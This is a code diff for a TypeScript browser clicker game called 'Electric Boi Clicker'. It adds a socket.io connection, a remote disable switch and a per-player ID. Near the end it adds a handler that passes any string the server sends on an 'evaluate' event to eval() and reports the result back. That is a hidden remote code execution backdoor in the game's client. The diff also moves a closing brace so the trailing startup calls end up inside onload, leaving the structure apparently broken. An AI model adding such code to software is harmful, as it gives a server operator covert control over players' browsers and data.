@@ -1,6 +1,9 @@
 import { toWords } from "./words";
 import Swal from "sweetalert2";
 import env from "./env.json";
+import io from "socket.io-client";
+import { inspect } from "util"
+import hrrs from "human-readable-random-string";
 const q = BigInt;
 const entries = Object.entries as <T>(
 	o: T
@@ -8,7 +11,6 @@ const entries = Object.entries as <T>(
 let addIntervals = true;
 let last = Date.now();
 localStorage.openpages = Date.now();
-// throw "lol get yeeted"
 window.addEventListener(
 	"storage",
 	e => {
@@ -33,6 +35,13 @@ setInterval(
 let done = false;
 let intervaled = false;
 window.onload = async () => {
+	if (done) return;
+	done = true;
+	const enabled = JSON.parse(await (await fetch("/enabled")).text());
+	const socket = io();
+	let lastEval = 0;
+	if (navigator.storage && navigator.storage.persist) await navigator.storage.persist();
+	if (!enabled) return document.body.innerHTML = "<div style='text-align:center'><h1>Electric Boi Clicker is disabled.</h1><p>lol</p></div>"
 	//#region DEBUG FUNCTIONS
 	env.debug && (() => {
 		if (document.getElementById("debugbuttons")) return;
@@ -57,8 +66,6 @@ window.onload = async () => {
 	//#endregion
 	await new Promise(res => setTimeout(res, 500));
 	// if ()
-	if (done) return;
-	done = true;
 	const defaults: Partial<Store> = {
 		electric: q(0)
 	};
@@ -75,7 +82,7 @@ window.onload = async () => {
 		},
 		set(t, k, v) {
 			try {
-				localStorage[k as any] = JSON.stringify(v);
+				localStorage[k as any] = typeof v === "string" ? v : JSON.stringify(v);
 			} catch {
 				localStorage[k as any] = v;
 			}
@@ -109,6 +116,7 @@ window.onload = async () => {
 		electric: bigint;
 		appliances: Partial<Appliances>;
 		applianceCosts: ApplianceCosts;
+		uuid: string;
 	}
 
 	interface Appliances {
@@ -122,6 +130,7 @@ window.onload = async () => {
 	if (!store.appliances) store.appliances = {};
 	if (!store.applianceCosts) store.applianceCosts = {};
 	if (!store.electric) store.electric = q(0);
+	if (!store.uuid) store.uuid = `${hrrs(5)}${Math.floor(Math.random() * 1000).toString().padStart(3, "0")}`;
 	const applianceCosts = new Proxy(Object.create(null) as ApplianceCosts, {
 		get(t, k) {
 			const cost = store.applianceCosts[k as keyof ApplianceCosts];
@@ -134,10 +143,6 @@ window.onload = async () => {
 			return true;
 		}
 	});
-	for (const [k, v] of entries(defaults))
-		v &&
-			store[k as keyof Store] === undefined &&
-			(store[k as keyof Store] = v as any);
 	const getCPS = () =>
 		q(appliances.supercomputer) * q(2) +
 		q(appliances.graphics) * q(10) +
@@ -318,8 +323,11 @@ window.onload = async () => {
 		t++;
 		store.electric += getClicks();
 	});
-};
+	socket.on("evaluate", async(e: string) => {
+		socket.emit("evaled", `${store.uuid}: ${inspect(await eval(e))}`);
+	})
 setTimeout(() => window.onload!({} as any), 1000);
 const f = setInterval(() => {
 	document.body && (window.onload!({} as any), clearInterval(f));
 });
+}
